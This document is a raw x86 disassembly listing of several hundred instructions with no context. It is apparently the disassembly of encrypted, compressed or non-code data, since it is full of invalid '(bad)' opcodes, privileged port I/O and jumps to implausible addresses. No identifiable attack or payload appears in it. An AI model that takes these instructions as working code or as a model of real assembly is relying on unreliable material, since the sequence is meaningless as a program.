  41b741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b742:	mov    ds:0x42709403,al
  41b747:	test   eax,0x144c8cdb
  41b74c:	jae    0x41b7ab
  41b74e:	imul   eax,DWORD PTR [edi],0x9b4f689
  41b754:	cmp    al,0x91
  41b756:	xchg   ecx,eax
  41b757:	sbb    DWORD PTR [ebx],eax
  41b759:	inc    esi
  41b75a:	pop    ebx
  41b75b:	push   eax
  41b75c:	ja     0x41b746
  41b75e:	aaa    
  41b75f:	daa    
  41b760:	push   ebx
  41b761:	imul   BYTE PTR [ebx-0x539c952b]
  41b767:	fcomp  DWORD PTR [esi]
  41b769:	xchg   esi,eax
  41b76a:	jmp    0x41b711
  41b76c:	in     al,0x6a
  41b76e:	dec    eax
  41b76f:	(bad)  
  41b770:	cli    
  41b771:	pop    ebx
  41b772:	lock cmp ebx,ebp
  41b775:	cmp    esp,esi
  41b777:	loopne 0x41b7db
  41b779:	jbe    0x41b701
  41b77b:	and    al,0xeb
  41b77d:	dec    edi
  41b77e:	lahf   
  41b77f:	and    eax,0x2f
  41b782:	lea    ebx,[ebp+0x13]
  41b785:	add    DWORD PTR [esi-0x44],esi
  41b788:	sahf   
  41b789:	fidiv  WORD PTR [edi]
  41b78b:	aam    0x2d
  41b78d:	cmp    dl,BYTE PTR [ecx]
  41b78f:	mov    bl,0x82
  41b791:	test   DWORD PTR [ecx+ecx*1+0x5ea2fc18],ebx
  41b798:	push   esi
  41b799:	mov    esp,edx
  41b79b:	outs   dx,DWORD PTR ds:[esi]
  41b79c:	dec    ebp
  41b79d:	fnstsw WORD PTR [ecx]
  41b79f:	dec    eax
  41b7a0:	les    esi,FWORD PTR [eax+0x5f36d9d2]
  41b7a6:	pop    es
  41b7a7:	jns    0x41b73d
  41b7a9:	f2xm1  
  41b7ab:	in     eax,0xef
  41b7ad:	lds    esp,FWORD PTR [ecx]
  41b7af:	push   esi
  41b7b0:	push   edx
  41b7b1:	mov    bh,0x1a
  41b7b3:	and    ecx,DWORD PTR [edi+edx*8+0x3e]
  41b7b7:	push   bx
  41b7b9:	xor    DWORD PTR [ebx+edx*8],edx
  41b7bc:	clc    
  41b7bd:	sbb    al,bh
  41b7bf:	push   esp
  41b7c0:	fild   QWORD PTR [edi-0x1dcd72]
  41b7c6:	mov    ah,0xe6
  41b7c8:	push   eax
  41b7c9:	mov    dh,dh
  41b7cb:	sub    DWORD PTR [ebx],edi
  41b7cd:	jecxz  0x41b84c
  41b7cf:	xlat   BYTE PTR ds:[ebx]
  41b7d0:	aaa    
  41b7d1:	mov    eax,0x71d98fa9
  41b7d6:	sub    BYTE PTR [esi+0x35c29a2e],bl
  41b7dc:	or     al,BYTE PTR [edx+ecx*4]
  41b7df:	hlt    
  41b7e0:	pushf  
  41b7e1:	xchg   ecx,eax
  41b7e2:	aas    
  41b7e3:	adc    ecx,DWORD PTR [ecx]
  41b7e5:	and    DWORD PTR [edx],eax
  41b7e7:	mov    es,WORD PTR [esi-0x745ce4dc]
  41b7ed:	cmp    ah,BYTE PTR [edi+ebp*2+0x28]
  41b7f1:	call   0xc3a013cb
  41b7f6:	cmc    
  41b7f7:	add    ebp,eax
  41b7f9:	add    BYTE PTR [edx+ebx*8],bh
  41b7fc:	or     BYTE PTR [esi-0x25],bh
  41b7ff:	pop    edx
  41b800:	push   ds
  41b801:	add    bh,BYTE PTR ds:0x4ceef56
  41b807:	and    eax,0x94b6b726
  41b80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b80d:	(bad)  
  41b80e:	hlt    
  41b80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b810:	xor    ebx,esp
  41b812:	in     eax,0x86
  41b814:	lahf   
  41b815:	enter  0x640f,0x30
  41b819:	adc    DWORD PTR [ebx+ecx*1+0x2930c592],eax
  41b820:	cmp    dl,bl
  41b822:	aaa    
  41b823:	int3   
  41b824:	stc    
  41b825:	adc    al,0x8f
  41b827:	sbb    esi,esi
  41b829:	ror    dl,0xce
  41b82c:	sub    dl,cl
  41b82e:	dec    ecx
  41b82f:	cli    
  41b830:	cmp    ecx,eax
  41b832:	cmp    eax,0xe0e1de9c
  41b837:	shl    BYTE PTR [ecx],cl
  41b839:	retf   0x69a7
  41b83c:	mov    ebx,0x4b5c6ff6
  41b841:	jp     0x41b7d6
  41b843:	pop    ecx
  41b844:	jl     0x41b819
  41b846:	push   0x7f
  41b848:	dec    ebx
  41b849:	inc    ecx
  41b84a:	icebp  
  41b84b:	ret    0x1d03
  41b84e:	mov    WORD PTR [edx+0x34],gs
  41b851:	xchg   edx,ebx
  41b853:	inc    ebx
  41b854:	dec    esi
  41b855:	scas   eax,DWORD PTR es:[edi]
  41b856:	pusha  
  41b857:	jno    0x41b89a
  41b859:	or     al,0xb5
  41b85b:	out    dx,eax
  41b85c:	xchg   esp,eax
  41b85d:	(bad)  [ebp+0x26681fec]
  41b863:	inc    esp
  41b864:	mov    al,0x22
  41b866:	xor    eax,0x2220eeec
  41b86b:	and    esp,DWORD PTR ss:[edx]
  41b86e:	dec    esi
  41b86f:	je     0x41b842
  41b871:	mov    esi,DWORD PTR [eax]
  41b873:	jmp    0x8bf4ad34
  41b878:	xchg   ebx,eax
  41b879:	arpl   WORD PTR [esi],ax
  41b87b:	int3   
  41b87c:	loope  0x41b8a0
  41b87e:	out    0x8b,al
  41b880:	jle    0x41b8bc
  41b882:	sbb    al,0x4d
  41b884:	loope  0x41b82a
  41b886:	and    BYTE PTR [ecx+0x8],dh
  41b889:	inc    edi
  41b88a:	jecxz  0x41b80d
  41b88c:	in     eax,dx
  41b88d:	cmp    DWORD PTR [edx],ebp
  41b88f:	(bad)  
  41b890:	xchg   ecx,eax
  41b891:	js     0x41b8cc
  41b893:	add    al,0xf5
  41b895:	inc    edi
  41b896:	jmp    0xd96383c4
  41b89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b89c:	daa    
  41b89d:	jl     0x41b910
  41b89f:	into   
  41b8a0:	xchg   DWORD PTR [esi-0x2d4e9d6d],edx
  41b8a6:	add    bh,dh
  41b8a8:	(bad)  
  41b8a9:	cmp    al,0x72
  41b8ab:	xchg   ecx,eax
  41b8ac:	cdq    
  41b8ad:	mov    WORD PTR [ecx],?
  41b8af:	adc    DWORD PTR [esi],esi
  41b8b1:	sbb    DWORD PTR [esi],ebp
  41b8b3:	dec    eax
  41b8b4:	cmp    BYTE PTR [esi-0x51],dl
  41b8b7:	mov    esp,0xf41d2c5
  41b8bc:	fnstcw WORD PTR [ebx-0x49]
  41b8bf:	push   esp
  41b8c0:	pop    es
  41b8c1:	jbe    0x41b8e0
  41b8c3:	xor    dl,BYTE PTR [edi+0x14c39c9e]
  41b8c9:	inc    ecx
  41b8ca:	outs   dx,DWORD PTR ds:[esi]
  41b8cb:	mov    DWORD PTR [ebx+0x2a],0xf5cf4daf
  41b8d2:	jge    0x41b8db
  41b8d4:	pop    ebp
  41b8d5:	adc    DWORD PTR [esi],ebx
  41b8d7:	in     eax,dx
  41b8d8:	cmp    edx,DWORD PTR [edi+0x48]
  41b8db:	rol    DWORD PTR [edi],1
  41b8dd:	cmp    dl,BYTE PTR ds:0xd4567a7e
  41b8e3:	es stc 
  41b8e5:	adc    BYTE PTR [eax],0x3c
  41b8e8:	es out 0xa6,al
  41b8eb:	mov    bh,0x36
  41b8ed:	test   al,0x32
  41b8ef:	mov    cl,BYTE PTR [ebx-0x51]
  41b8f2:	out    dx,eax
  41b8f3:	scas   al,BYTE PTR es:[edi]
  41b8f4:	cmc    
  41b8f5:	jecxz  0x41b960
  41b8f7:	jge    0x41b90a
  41b8f9:	dec    edi
  41b8fa:	add    BYTE PTR [eax-0x2d382d1c],0xfa
  41b901:	out    0xa6,al
  41b903:	ror    BYTE PTR [eax+0x46eec06d],0x31
  41b90a:	aam    0xcf
  41b90c:	lods   al,BYTE PTR ds:[esi]
  41b90d:	cli    
  41b90e:	xchg   esi,eax
  41b90f:	das    
  41b910:	inc    esi
  41b911:	cmc    
  41b912:	sbb    al,0x1e
  41b914:	add    DWORD PTR [ecx-0x63],edx
  41b917:	out    dx,eax
  41b918:	das    
  41b919:	retf   
  41b91a:	mov    dh,0x9f
  41b91c:	test   eax,0x256a8e4f
  41b921:	out    0xf6,eax
  41b923:	inc    esp
  41b924:	js     0x41b8e3
  41b926:	or     ecx,eax
  41b928:	mov    ecx,0xcf731443
  41b92d:	test   al,0xba
  41b92f:	sbb    BYTE PTR [edi],0xc4
  41b932:	ss mov bl,0xe1
  41b935:	scas   eax,DWORD PTR es:[edi]
  41b936:	call   0xbd6fbce0
  41b93b:	mov    al,0xf2
  41b93d:	cmp    DWORD PTR [ecx],edi
  41b93f:	inc    DWORD PTR [edx-0x71]
  41b942:	sbb    eax,0xdf98aad1
  41b947:	push   ebx
  41b948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b949:	call   0xe1bd:0x198df29c
  41b950:	mov    ecx,0xab355010
  41b955:	cli    
  41b956:	cli    
  41b957:	jmp    0xfca7:0xe325bfbc
  41b95e:	xchg   ebp,eax
  41b95f:	popf   
  41b960:	and    bl,BYTE PTR [esi+esi*4]
  41b963:	jp     0x41b947
  41b965:	aaa    
  41b966:	jno    0x41b901
  41b968:	push   0x70
  41b96a:	pop    edx
  41b96b:	or     eax,0xc0478979
  41b970:	or     al,0x9a
  41b972:	push   0x7c
  41b974:	stos   BYTE PTR es:[edi],al
  41b975:	xchg   esi,eax
  41b976:	push   ebp
  41b977:	add    BYTE PTR [esi-0x74a24af5],bh
  41b97d:	or     DWORD PTR [eax-0x1c],edx
  41b980:	xor    DWORD PTR [ebx],ecx
  41b982:	cli    
  41b983:	in     al,0xf5
  41b985:	xor    ch,0x71
  41b988:	call   0xa737161c
  41b98d:	jns    0x41ba07
  41b98f:	imul   edx,DWORD PTR [eax],0xffffffb0
  41b992:	rcl    BYTE PTR [edi+0x41b53677],0x25
  41b999:	and    eax,0xb41bfdf2
  41b99e:	test   al,0x28
  41b9a0:	loop   0x41ba10
  41b9a2:	jmp    0x9ad38ec3
  41b9a7:	gs mov edx,0x9f0ab2bd
  41b9ad:	sub    al,0xeb
  41b9af:	psubsw mm1,QWORD PTR [edx-0x49]
  41b9b3:	nop
  41b9b4:	cmp    cl,BYTE PTR [eax+edx*4]
  41b9b7:	or     bh,BYTE PTR [ecx]
  41b9b9:	or     DWORD PTR [esi+0x64],esp
  41b9bc:	dec    ecx
  41b9bd:	cmp    bh,BYTE PTR [edi-0x5c]
  41b9c0:	xchg   edx,eax
  41b9c1:	aam    0x96
  41b9c3:	sub    esp,ecx
  41b9c5:	push   ss
  41b9c6:	add    ch,BYTE PTR [edx]
  41b9c8:	frstor [eax-0x1b]
  41b9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9cc:	jge    0x41b97c
  41b9ce:	dec    ecx
  41b9cf:	daa    
  41b9d0:	fwait
  41b9d1:	mov    ebp,0x3243eae4
  41b9d6:	mov    esp,0xa399155f
  41b9db:	(bad)  
  41b9dc:	in     eax,0x53
  41b9de:	jmp    0x41ba20
  41b9e0:	(bad)  
  41b9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e2:	mov    ebx,0xe1edd2c7
  41b9e7:	add    al,0x33
  41b9e9:	or     edx,DWORD PTR [ebx-0x4d]
  41b9ec:	fcmovnu st,st(3)
  41b9ee:	cmp    BYTE PTR [ecx-0xa],bl
  41b9f1:	ins    BYTE PTR es:[edi],dx
  41b9f2:	mov    ds:0x3ba2455f,al
  41b9f7:	fidivr DWORD PTR fs:[edi+0x25]
  41b9fb:	test   DWORD PTR [edi+0x8],edi
  41b9fe:	hlt    
  41b9ff:	call   0x7d723d84
  41ba04:	inc    ecx
  41ba05:	cmp    eax,esi
  41ba07:	loop   0x41ba71
  41ba09:	and    al,0x89
  41ba0b:	mov    ds:0xcdb2edab,al
  41ba10:	std    
  41ba11:	test   ah,0xd
  41ba14:	mov    bh,BYTE PTR [ebx-0x20]
  41ba17:	and    ah,BYTE PTR [esi-0x26]
  41ba1a:	stc    
  41ba1b:	pop    ecx
  41ba1c:	xchg   edx,eax
  41ba1d:	test   al,0xef
  41ba1f:	jg     0x41ba4f
  41ba21:	push   edx
  41ba22:	mov    edi,DWORD PTR [esi+0x76263299]
  41ba28:	loope  0x41ba2a
  41ba2a:	sahf   
  41ba2b:	sub    esi,ecx
  41ba2d:	adc    DWORD PTR [eax+0x67],ebx
  41ba30:	pop    es
  41ba31:	inc    eax
  41ba32:	or     edi,DWORD PTR ds:0xb9b2dd0c
  41ba38:	mov    bh,0xdc
  41ba3a:	sbb    eax,DWORD PTR [esp+ecx*8-0x65aa5cb4]
  41ba41:	jbe    0x41b9d8
  41ba43:	cmp    eax,0x90c6433a
  41ba48:	cmc    
  41ba49:	gs mov edx,0x4dbc8a8f
  41ba4f:	pop    esp
  41ba50:	(bad)  
  41ba51:	jo     0x41ba28
  41ba53:	or     ch,BYTE PTR [edi]
  41ba55:	and    eax,0x1324c318
  41ba5a:	cmp    eax,0xa4ad7606
  41ba5f:	adc    DWORD PTR ds:0x4eeb0917,edi
  41ba65:	sub    eax,0x16375406
  41ba6a:	xor    DWORD PTR [esi+edi*8+0x1e],ebp
  41ba6e:	dec    ebp
  41ba6f:	pop    ebx
  41ba70:	lods   al,BYTE PTR ds:[esi]
  41ba71:	mov    esi,0xe87392c5
  41ba76:	scas   al,BYTE PTR es:[edi]
  41ba77:	push   cs
  41ba78:	mov    ecx,0xd5b78f8b
  41ba7d:	jmp    DWORD PTR [esi]
  41ba7f:	pushf  
  41ba80:	xor    DWORD PTR [eax-0x29984680],edi
  41ba86:	jo     0x41baa4
  41ba88:	pop    esi
  41ba89:	and    DWORD PTR [ebp+0x73278685],esi
  41ba8f:	push   cs
  41ba90:	cmp    BYTE PTR [esi],cl
  41ba92:	test   BYTE PTR [ebp+0x5a1e632d],bh
  41ba98:	jnp    0x41baa9
  41ba9a:	in     al,dx
  41ba9b:	sti    
  41ba9c:	jno    0x41bace
  41ba9e:	xlat   BYTE PTR ds:[ebx]
  41ba9f:	jg     0x41ba36
  41baa1:	stos   DWORD PTR es:[edi],eax
  41baa2:	(bad)  
  41baa3:	in     al,dx
  41baa4:	mov    ah,0xd9
  41baa6:	xor    DWORD PTR [edi-0x4a221bd8],0x99ae02d5
  41bab0:	adc    eax,0xb7244d78
  41bab5:	mov    cs,WORD PTR [ebp+0x53]
  41bab8:	sbb    ebp,ebp
  41baba:	fidiv  WORD PTR [edx-0x27]
  41babd:	mov    dh,0x2c
  41babf:	and    ch,BYTE PTR [ebp-0x70]
  41bac2:	dec    BYTE PTR ds:0x1a8a3fe9
  41bac8:	mov    DWORD PTR [edx+ebx*1-0x61],esi
  41bacc:	les    esp,FWORD PTR [ebx]
  41bace:	pop    ecx
  41bacf:	(bad)  
  41bad0:	or     dl,dl
  41bad2:	rcl    DWORD PTR [ecx-0x59bd2a69],0xf3
  41bad9:	out    dx,al
  41bada:	adc    ebp,DWORD PTR ds:0x57dc2900
  41bae0:	push   ebp
  41bae1:	sahf   
  41bae2:	std    
  41bae3:	arpl   WORD PTR [esi],bp
  41bae5:	cs jnp 0x41bacc
  41bae8:	cs push 0xe9da3684
  41baee:	push   ebp
  41baef:	das    
  41baf0:	mov    WORD PTR [eax-0x7e14e66],gs
  41baf6:	scas   al,BYTE PTR es:[edi]
  41baf7:	popf   
  41baf8:	mov    BYTE PTR [ebx+0x2f],bl
  41bafb:	add    BYTE PTR [ebx-0x1cf6618a],0xf2
  41bb02:	outs   dx,DWORD PTR ds:[esi]
  41bb03:	add    DWORD PTR [ebp+0x181e8fda],ebx
  41bb09:	sub    BYTE PTR [ebp+0x3313d8bc],bl
  41bb0f:	mov    ch,0x19
  41bb11:	pop    edx
  41bb12:	mov    edi,0xd894e111
  41bb17:	int3   
  41bb18:	in     al,0x95
  41bb1a:	bound  edx,QWORD PTR ds:0xdf11e7c4
  41bb20:	and    al,0x4
  41bb22:	je     0x41bae7
  41bb24:	and    BYTE PTR [ebx-0x1b],dh
  41bb27:	ficom  WORD PTR [esi+0x27]
  41bb2a:	jmp    0x6473:0xb28e5967
  41bb31:	jl     0x41bab7
  41bb33:	and    eax,0x59d7fce0
  41bb38:	xchg   ebx,eax
  41bb39:	mov    BYTE PTR [ebp-0x447c04e2],al
  41bb3f:	mov    edx,0x703d0770
  41bb44:	lock cld 
  41bb46:	and    ebp,DWORD PTR [esi+0x3af2fdf7]
  41bb4c:	dec    esi
  41bb4d:	(bad)  
  41bb4f:	dec    DWORD PTR [ecx+edx*2]
  41bb52:	xor    al,0x46
  41bb54:	lea    ecx,[ebx-0x7ee3e30d]
  41bb5a:	inc    esp
  41bb5b:	xlat   BYTE PTR ds:[ebx]
  41bb5c:	lock inc ecx
  41bb5e:	data16 jg 0x41bb0f
  41bb61:	mov    esi,0xddb7a41a
  41bb66:	inc    esi
  41bb67:	call   0xc6380c27
  41bb6c:	mov    dl,0xae
  41bb6e:	pop    edi
  41bb6f:	lahf   
  41bb70:	fcmovu st,st(0)
  41bb72:	mov    cs,WORD PTR [esi-0x80]
  41bb75:	add    BYTE PTR ds:0x728ffd62,0x24
  41bb7c:	adc    ecx,DWORD PTR [eax-0x5fa4210d]
  41bb82:	std    
  41bb83:	loope  0x41bb11
  41bb85:	ins    DWORD PTR es:[edi],dx
  41bb86:	sub    eax,0x9dde93ab
  41bb8b:	inc    edx
  41bb8c:	in     eax,0xbd
  41bb8e:	mov    cs,WORD PTR [eax]
  41bb90:	dec    ebx
  41bb91:	cmc    
  41bb92:	mov    ch,0x7b
  41bb94:	jne    0x41bb78
  41bb96:	(bad)  
  41bb97:	aaa    
  41bb98:	retf   
  41bb99:	or     eax,0x9210fa5
  41bb9e:	pusha  
  41bb9f:	adc    al,0xe6
  41bba1:	add    ebp,DWORD PTR [ebx-0x6ccda8cf]
  41bba7:	int    0xd9
  41bba9:	je     0x41bb48
  41bbab:	xor    al,0x5b
  41bbad:	jae    0x41bbe9
  41bbaf:	cmp    eax,0xce04daea
  41bbb4:	dec    esp
  41bbb5:	mov    edi,0x44211814
  41bbba:	xchg   edi,eax
  41bbbb:	mov    ah,0xbd
  41bbbd:	mov    esi,0x7556a26c
  41bbc2:	(bad)  
  41bbc3:	jnp    0x41bbee
  41bbc5:	xor    ecx,DWORD PTR ds:0xc1e2a5ee
  41bbcb:	arpl   sp,di
  41bbcd:	cs fxch st(7)
  41bbd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd1:	jno    0x41bb62
  41bbd3:	aaa    
  41bbd4:	lds    eax,FWORD PTR [esi]
  41bbd6:	scas   al,BYTE PTR es:[edi]
  41bbd7:	add    edx,DWORD PTR [eax+0x4ce4c6a7]
  41bbdd:	inc    ebp
  41bbde:	push   ecx
  41bbdf:	sbb    BYTE PTR [edx+ebp*2],dl
  41bbe2:	cli    
  41bbe3:	hlt    
  41bbe4:	cmp    edi,DWORD PTR [edx]
  41bbe6:	xchg   BYTE PTR [ebp+0x47],bl
  41bbe9:	inc    eax
  41bbea:	scas   al,BYTE PTR es:[edi]
  41bbeb:	data16 add BYTE PTR ds:0xa20ff706,cl
  41bbf2:	dec    ecx
  41bbf3:	rcl    BYTE PTR [ecx-0x71],1
  41bbf6:	cmp    al,0xd6
  41bbf8:	sub    DWORD PTR [esi-0x730ef097],0xa
  41bbff:	jle    0x41bc4c
  41bc01:	stos   DWORD PTR es:[edi],eax
  41bc02:	xchg   ebp,eax
  41bc03:	(bad)  
  41bc04:	sar    DWORD PTR [edi-0x6d],cl
  41bc07:	mov    ds:0x9915c640,al
  41bc0c:	pusha  
  41bc0d:	mov    WORD PTR [ecx],es
  41bc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc10:	shl    edx,1
  41bc12:	mov    ds:0x6beaeca4,al
  41bc17:	ins    DWORD PTR es:[edi],dx
  41bc18:	pop    es
  41bc19:	push   esp
  41bc1a:	mov    edi,0x16e1c266
  41bc1f:	mov    ss,WORD PTR [edx]
  41bc21:	add    al,0xf6
  41bc23:	fbld   TBYTE PTR [esi-0xd49baba]
  41bc29:	dec    esi
  41bc2a:	cdq    
  41bc2b:	aas    
  41bc2c:	es mov eax,0x5b34ffb8
  41bc32:	pop    ebx
  41bc33:	sbb    eax,0x8fd7148b
  41bc38:	mov    ds:0xefd9e2f,al
  41bc3d:	adc    eax,0xf7a14d8a
  41bc42:	push   esi
  41bc43:	lea    edx,[ecx]
  41bc45:	pop    es
  41bc46:	jno    0x41bc21
  41bc48:	rol    cl,cl
  41bc4a:	fmul   DWORD PTR [edi+edi*4]
  41bc4d:	cmc    
  41bc4e:	sub    BYTE PTR [ebp+0x3cf3c861],dl
  41bc54:	mov    ebp,0x31ac29d7
  41bc59:	out    0x74,al
  41bc5b:	ss ins BYTE PTR es:[edi],dx
  41bc5d:	loop   0x41bc24
  41bc5f:	sub    al,0x53
  41bc61:	or     edi,esp
  41bc63:	(bad)  
  41bc64:	das    
  41bc65:	or     DWORD PTR [eax+esi*8+0x89690e3],ecx
  41bc6c:	or     bh,ah
  41bc6e:	add    BYTE PTR [esi],dl
  41bc70:	push   ebp
  41bc71:	inc    bx
  41bc73:	push   ds
  41bc74:	jl     0x41bcc9
  41bc76:	retf   0xd39a
  41bc79:	out    0x52,al
  41bc7b:	mov    cl,0x49
  41bc7d:	push   eax
  41bc7e:	mov    eax,0x2438fb13
  41bc83:	dec    esp
  41bc84:	xchg   ecx,eax
  41bc85:	into   
  41bc86:	into   
  41bc87:	das    
  41bc88:	sub    al,0xf2
  41bc8a:	pop    eax
  41bc8b:	push   ds
  41bc8c:	mov    ch,0x1b
  41bc8e:	mov    bl,0xbe
  41bc90:	adc    DWORD PTR [edx],edx
  41bc92:	sub    al,0x88
  41bc94:	ds test eax,0x40b318db
  41bc9a:	shr    DWORD PTR [ecx-0x3c79d8a8],0x2b
  41bca1:	or     DWORD PTR [esi+0x725f2915],0xd4f185b1
  41bcab:	rol    bh,1
  41bcad:	fcomp  DWORD PTR [ecx-0x66]
  41bcb0:	dec    edi
  41bcb1:	leave  
  41bcb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcb3:	jno    0x41bc8b
  41bcb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcb6:	pusha  
  41bcb7:	int    0x97
  41bcb9:	ret    0xbf62
  41bcbc:	(bad)  
  41bcbd:	out    dx,al
  41bcbe:	jb     0x41bca8
  41bcc0:	cli    
  41bcc1:	pop    ebx
  41bcc2:	stc    
  41bcc3:	fbstp  TBYTE PTR [esi+0x2a]
  41bcc6:	mov    edx,DWORD PTR [eax+0x469924c0]
  41bccc:	stos   BYTE PTR es:[edi],al
  41bccd:	mov    edx,0x7baecacf
  41bcd2:	or     eax,0x5fe4002
  41bcd7:	pop    edi
  41bcd8:	sbb    cl,BYTE PTR [edx-0x22]
  41bcdb:	xchg   ecx,eax
  41bcdc:	inc    ebp
  41bcdd:	mov    eax,ds:0x887f897a
  41bce2:	adc    DWORD PTR [eax],esp
  41bce4:	jo     0x41bce6
  41bce6:	adc    eax,0x2b9d7c27
  41bceb:	adc    eax,0x93212d42
  41bcf0:	inc    ebp
  41bcf1:	aaa    
  41bcf2:	xor    ecx,ecx
  41bcf4:	and    ecx,ebp
  41bcf6:	js     0x41bcc0
  41bcf8:	inc    eax
  41bcf9:	mov    bl,0xb
  41bcfb:	(bad)  
  41bcfc:	aaa    
  41bcfd:	cdq    
  41bcfe:	adc    eax,0xa0da9f0c
  41bd03:	push   edi
  41bd04:	cdq    
  41bd05:	ins    BYTE PTR es:[edi],dx
  41bd06:	inc    edi
  41bd07:	push   0xf381252c
  41bd0c:	das    
  41bd0d:	mov    esp,0xf5241ce8
  41bd12:	mov    esi,DWORD PTR [edi-0x3]
  41bd15:	jne    0x41bcba
  41bd17:	das    
  41bd18:	push   edx
  41bd19:	and    eax,DWORD PTR [edi]
  41bd1b:	das    
  41bd1c:	add    cl,al
  41bd1e:	xchg   ebp,eax
  41bd1f:	imul   ebp
  41bd21:	sub    eax,0xde81a19b
  41bd26:	out    dx,al
  41bd27:	das    
  41bd28:	mov    eax,ds:0x1c3b28a2
  41bd2d:	xchg   edx,eax
  41bd2e:	xchg   esi,eax
  41bd2f:	cli    
  41bd30:	push   ecx
  41bd31:	cs push 0xffffffa0
  41bd34:	in     al,dx
  41bd35:	xlat   BYTE PTR ds:[ebx]
  41bd36:	mov    esp,0x3ecbef89
  41bd3b:	es jmp 0x41bd63
  41bd3e:	inc    ecx
  41bd3f:	push   ds
  41bd40:	shl    BYTE PTR [ecx+0x23],cl
  41bd43:	iret   
  41bd44:	xchg   BYTE PTR [edi+ebp*2-0x5122fd9e],dh
  41bd4b:	dec    eax
  41bd4c:	fdivr  DWORD PTR [edi]
  41bd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4f:	xor    BYTE PTR [ecx],dh
  41bd51:	pop    ecx
  41bd52:	push   esi
  41bd53:	add    BYTE PTR [esi-0x4d],dl
  41bd56:	sbb    al,0x95
  41bd58:	mov    edx,0x7f8c295
  41bd5d:	nop
  41bd5e:	mov    BYTE PTR [esi-0x61],dh
  41bd61:	(bad)  
  41bd62:	and    eax,0xc045858
  41bd67:	in     al,dx
  41bd68:	out    dx,al
  41bd69:	cmp    bh,BYTE PTR [esi+0x504c8257]
  41bd6f:	sub    ebx,0xd7a0e3a4
  41bd75:	add    al,0x27
  41bd77:	aad    0x4f
  41bd79:	shl    BYTE PTR [ecx-0x37058a43],0x74
  41bd80:	ja     0x41bdf5
  41bd82:	sub    bh,al
  41bd84:	fimul  DWORD PTR [edx-0x1a5e1d4f]
  41bd8a:	add    bl,BYTE PTR [edx+0xd]
  41bd8d:	jo     0x41bd3f
  41bd8f:	dec    edx
  41bd90:	gs xor eax,0xa891f257
  41bd96:	mov    ebp,0x462ad7dd
  41bd9b:	sub    esp,ebx
  41bd9d:	mov    cl,0xc9
  41bd9f:	and    al,0x98
  41bda1:	adc    BYTE PTR [edx],0xcf
  41bda4:	pop    ss
  41bda5:	dec    edi
  41bda6:	mov    ch,0xa2
  41bda8:	ins    DWORD PTR es:[edi],dx
  41bda9:	shl    DWORD PTR [ebx-0xf],0xc5
  41bdad:	dec    edi
  41bdae:	pop    esp
  41bdaf:	enter  0x1c02,0x9b
  41bdb3:	lods   eax,DWORD PTR ds:[esi]
  41bdb4:	sub    edi,ebx
  41bdb6:	gs ss xchg cx,ax
  41bdba:	rcr    ebp,cl
  41bdbc:	sbb    al,0x2d
  41bdbe:	jnp    0x41be23
  41bdc0:	in     al,0xbf
  41bdc2:	sub    edx,ebp
  41bdc4:	imul   ebp,DWORD PTR [esi],0x44
  41bdc7:	adc    ah,ch
  41bdc9:	mov    al,ds:0xebcbe8f
  41bdce:	es je  0x41bdc2
  41bdd1:	mov    DWORD PTR [eax+eax*4],ebp
  41bdd4:	push   esp
  41bdd5:	push   ebx
  41bdd6:	popf   
  41bdd7:	add    eax,0xbbbbac65
  41bddc:	ret    0x616f
  41bddf:	xchg   ebx,eax
  41bde0:	ret    0x4f48
  41bde3:	out    dx,eax
  41bde4:	(bad)  
  41bde6:	push   cs
  41bde7:	out    dx,eax
  41bde8:	sbb    eax,0x34ae096c
  41bded:	stc    
  41bdee:	out    dx,al
  41bdef:	adc    DWORD PTR [esi-0x6],0x14ecd3a7
  41bdf6:	retf   0xc6a6
  41bdf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdfa:	xor    ebp,eax
  41bdfc:	int    0x1
  41bdfe:	(bad)  
  41bdff:	in     eax,dx
  41be00:	in     al,0x96
  41be02:	test   BYTE PTR [ebp-0x3c4c164],dh
  41be08:	sub    BYTE PTR [esi+0x18],dl
  41be0b:	xor    ebp,DWORD PTR [ebp-0x50]
  41be0e:	or     ebp,esi
  41be10:	push   0x26
  41be12:	sub    dl,cl
  41be14:	sbb    BYTE PTR [ecx+ebx*2-0x35],ah
  41be18:	ins    BYTE PTR es:[edi],dx
  41be19:	ins    BYTE PTR es:[di],dx
  41be1b:	sbb    BYTE PTR [eax-0x54f61bce],0x77
  41be22:	mov    ebx,esi
  41be24:	test   BYTE PTR [edi-0x7c],cl
  41be27:	sbb    al,0xc2
  41be29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be2a:	or     eax,0xf982d625
  41be2f:	mov    cl,0xb3
  41be31:	cmp    eax,0x411b06a7
  41be36:	into   
  41be37:	mov    al,ds:0x7d2915c9
  41be3c:	out    dx,eax
  41be3d:	mov    bh,0x29
  41be3f:	jne    0x41be8d
  41be41:	add    eax,0x926563b7
  41be46:	push   0xffffffa9
  41be48:	das    
  41be49:	xchg   ebp,eax
  41be4a:	or     BYTE PTR [edx],dh
  41be4c:	mov    al,ds:0xdc1b0f2b
  41be51:	adc    ecx,DWORD PTR [eax]
  41be53:	push   0x959d3b18
  41be58:	lea    ebp,[ecx+0x4f586a0e]
  41be5e:	pop    ss
  41be5f:	xor    al,0xce
  41be61:	cmp    BYTE PTR [ebx-0x79cda5a5],cl
  41be67:	jo     0x41be2b
  41be69:	call   0x631dd681
  41be6e:	cmp    cl,BYTE PTR [eax+0x6d706d40]
  41be74:	test   BYTE PTR [ecx+0x6b749f13],ch
  41be7a:	xor    DWORD PTR [eax],ebx
  41be7c:	mov    eax,ds:0xfe243177
  41be81:	adc    bl,bh
  41be83:	mov    dl,0x26
  41be85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be86:	push   ebx
  41be87:	pop    ebp
  41be88:	or     dl,0xd7
